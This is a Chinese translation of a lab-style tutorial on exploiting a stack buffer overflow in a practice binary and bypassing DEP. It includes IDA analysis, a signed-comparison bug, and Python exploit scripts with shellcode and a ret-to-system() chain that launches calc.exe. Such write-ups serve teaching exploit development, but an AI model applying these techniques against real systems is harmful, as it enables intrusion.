
# [翻译]绕过数据执行保护

**原文链接：<mark>3deK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6l9H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3N6q4)9J5c8X3u0&6M7r3q4K6M7#2)9J5k6r3c8S2N6r3q4Q4x3X3c8W2P5r3g2U0N6i4c8A6L8$3&6Q4x3X3c8H3M7X3!0@1k6h3y4@1K9h3!0F1i4K6u0V1k6r3g2H3i4K6u0r3y4U0V1^5z5q4)9J5b7g2)9J5b7b7`.`.</mark>**

**翻译：wangrin 看雪翻译小组**

大家好!这篇文章的主题是如何溢出缓冲区,绕过DEP(数据执行保护)并且控制可执行程序。

## 先决条件：

- C/C++语言，基础水平即可
- 英特尔x86汇编
- 熟悉缓冲区溢出
- 调试器/反编译

## 文件：

- <a href="https://bbs.kanxue.com/elink@d4eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6#2k6X3W2D9k6g2)9J5k6h3W2G2i4K6u0r3y4r3c8G2K9$3t1`.">File</a>
- <a href="https://bbs.kanxue.com/elink@e95K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2$3K9i4u0#2M7%4c8G2N6r3q4D9i4K6u0W2j5$3!0E0i4K6u0r3i4K6t1K6i4K6u0r3k6X3W2D9k6g2)9J5c8U0j5#2k6o6b7@1k6e0j5&6k6o6S2T1y4$3g2X3x3U0W2V1x3$3p5J5z5o6R3I4z5h3c8W2y4o6M7%4y4r3x3@1x3U0u0X3z5r3p5^5z5o6M7#2z5r3g2W2z5o6l9#2k6h3t1I4x3h3t1J5j5$3u0U0x3o6R3I4k6h3x3H3j5e0u0Q4x3V1k6V1k6i4c8W2j5%4c8A6L8$3^5`.">Virustotal</a>

好的，我们需要做的第一件事是看看可执行文件会给我们什么信息，所以我们运行它：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_G9J8E4WJJ6WT392.png)

这里我们看到它正在请求一个文件文件。但由于文件不存在，程序返回给我们它不能打开，创建文件后，我们看到它显示了一个消息，3个值为0，似乎对应3个变量(`cookie`, `cookie2`和`size`)，除此之外就没别的东西了。

既然我们不知道它的作用，让我们来看看它。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WRPSD5Q7MB57MCC.png)

这个函数有5个变量，其中4个变量被初始化为零，1个变量在(`("2")`)处初始化为`0x32`，一个指向`LoadLibrary`的指针存储在`0x10103024`处，然后以二进制读取模式`fopen` `"fichero.dat"`文件，存储文件指针在`0x10103020`，最后检查它是否存在，如果它不存在，它将转到`0x101010d3`并关闭(正如我们之前看到的)，如果它存在，它将转到`0x101010e9`，让我们看看那里。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_EQD5SK6BQVWJ6WV.png)

在这个过程中，它首先使用`fread`从文件`fichero.dat`中读取4字节并将它们存储在一个指针指向看起来像是一块内存的地方(`ebp-c`),`fread`返回读取元素的总数并且将它存储在`ebp-8`,接着继续`fread`从文件中读4个字节并将它们存储在一个指针指向`ebp-10`的内存区域，然后它再一次重复这个过程并将1个字节存储在一个指针`ebp-1`,最后将这个字节与(`ebp-14`)即`0x32`(`("2")`)比较,如果是小于或等于(`jle`),就会转到`0x10101155`，如果不是这样,显示一条“Nos fuimos al carajo”(我们要滚蛋了)信息，接着就关闭了。

然后我们写入文件8字节+正确的字节(`"2"`)，然后输入`0x10101155`，例如：

`1234 + 5678 + 2`

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_683W6EHZ8SHZ9EP.png)

在这里，它使用`fread`入栈保存字节并打印它们，使用`malloc`分配50字节(`32h`)内存，将返回的内存指针存储到`ebp-1c`中，然后入栈`fichero.dat`的前8字节到`0x10101010`:

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_TYX7RSGU7KEW6VB.png)

好的，它在这里做的是它取`fichero.dat`的前4个字节，将它们添加到以下4个字节，然后将结果与`0x58552433`进行比较，如果条件正确，加载`pepe.dll`。然后让我们确保满足条件(因为它是小端字节，我们必须把字节反向)

因为并不是所有的字符都符合`"0"(30h)` + `"("(28h)` = `58h`(1字节正确)的条件，所以我们做了一个脚本来完成它

``` 
data = "\x21\x1210" + "\x12\x12$(" + "2"
with open("fichero.dat", "w") as file:
    file.write(data)
```

好的，这一定能够满足条件的，我们看看：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_U2N3K7XAUHTQ526.png)

让我们看看现在是什么情况：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WPZQDN9TKE2TN2V.png)

离开`0x10101010`之后，我们会看到它用`fread`读取了`fichero.dat`的`[ebp-1]`字节并将他们存储在一个指向(`ebp-54`)的缓冲区中，好的，这是一个缓冲区溢出，让我们分析一下。

首先我们看到`fichero.dat`的第9个字节存储在`[ebp-1]`中，然后与`[ebp-14]`(`"2"`)进行比较。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_8HFMCMKTMD9D6J6.png)

现在我们看到字节(`[ebp-1]`)是`fread`的读取大小，并将大小存在一个(`ebp-54`)52字节缓冲区,正如最近的变量是`ebp-20`,我们有`[ebp-54]-[ebp-20]=[ebp-34]`,所以是`0x34(52d)`,我们还可以看到在`IDA`堆栈,右键->array->ok:

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_S3TRJMRBD8CBXXE.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_DHTJBBV7YZH5TVC.png)

知道了这些，我们怎么能溢出缓冲区呢?

`[ebp-1]`是`fichero.dat`的第9个字节。`fread`的大小存储在缓冲区中`[ebp-54]`，并且必须小于或等于`0x32`(`"2"`)。

我们知道十六进制的负数在十进制里会溢出，所以如果我们在十六进制里放一个负数它会允许我们输入比允许的更多的字节(52d)这是因为它是有符号的(`jle`)

``` 
0x10101139 movsx ecx, byte ptr ss:[ebp-1]
0x1010113d cmp ecx, dword ptr ss:[ebp-14]
0x10101140 jle stack9b.10101155
```

让我们尝试到达缓冲区的边缘，同时溢出`fread`的2字节(50字节，32h)。

``` 
data = "\x21\x1210" + "\x12\x12$(" + "\xff" + "A" * 52
with open("fichero.dat", "w") as file:
    file.write(data)
```

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_NBUVDBPFPZ5NSPY.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_MNZU4XPX8DVW7EP.png)

酷啊! ! !让我们看看是否可以控制`retn`。

有一个过程，它复制内存中`malloc` `[ebp-1c]`分配的块的缓冲区字节`[ebp-54]`

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_NH9SGD53S5ZP8WW.png)

所以，如果我用`"\x41x41\x41\x41\x41"`来填`[ebp-1c]`，因为它不是一个有效地址所以我们不能写入，那我们来找一个有效地址。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_JKPNPSEGYDFVRH6.png)

好了，让我们检查堆栈，看看需要多少字节才能到达`retn`并控制它。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_WTU5DTRWKB39JF6.png)

好的，现在我们来编写`exploit`：

``` 
import subprocess
shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"
buff = "\x41" * 52
ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10" # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4 # ebp
r = shellcode
data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r
with open("fichero.dat", "w") as file:
    file.write(data)
subprocess.call(r"stack9b.exe")
```

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_UKKMCPBGT5XGJCA.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_K82PH48T3JB4PX4.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_HK4SMV2HW8QYE36.png)

好的，我们已经控制了`EIP`，但是现在它不允许我执行我的`shellcode`，这是由于`DEP`(数据执行保护)。

总结一下，`DEP`修改了存储数据的段的权限，以防止我们在那里执行代码 --ricnar

因此，为了绕过`DEP`，我们可以使用`ROP`(返回导向编程)，它基本上是使用程序的可执行代码片段,执行一些`api`(如`VirtualProtect`或`VirtualAlloc`)改变堆栈权限。

在`pepe.dll`寻找`gadget`中我找不到`VirtualAlloc`，但是有一个指向`system()`的指针，只会缺少一个`return`，可以使用`exit()`和一个固定位置的我们可以控制将一个字符串传递给`system()`的值。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_3ESHC5DU65T4ZZP.png)

现在只缺`system()`的参数了，我们可以使用带有写权限的地址：

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_7K25GHNAARHTQ87.png)

这里我设置了堆栈，因为`malloc`只分配了50个字节且没有控制`eip`，这就是`exp`的样子。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_VUWN987RSKZ6FV6.png)

``` 
import subprocess
system = "\x24\x98\x01\x78" # system()
calc = "calc.exe"
buff = "\x41" * 42
# ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10" # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4 # ebp
r = system
exit = "\x78\x1d\x10\x10" # exit()
ptr_calc = "\x5a\x30\x10\x10"
data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + calc + "\x41" * 6 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calc
with open("fichero.dat", "w") as file:
    file.write(data)
subprocess.call(r"stack9b.exe")
```

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_CMT28HYV4CZ5XTX.png)

**原文链接：<mark>863K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6l9H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3N6q4)9J5c8X3u0&6M7r3q4K6M7#2)9J5k6r3c8S2N6r3q4Q4x3X3c8W2P5r3g2U0N6i4c8A6L8$3&6Q4x3X3c8H3M7X3!0@1k6h3y4@1K9h3!0F1i4K6u0V1k6r3g2H3i4K6u0r3y4U0V1^5z5l9`.`.</mark>**

**翻译：wangrin 看雪翻译小组**
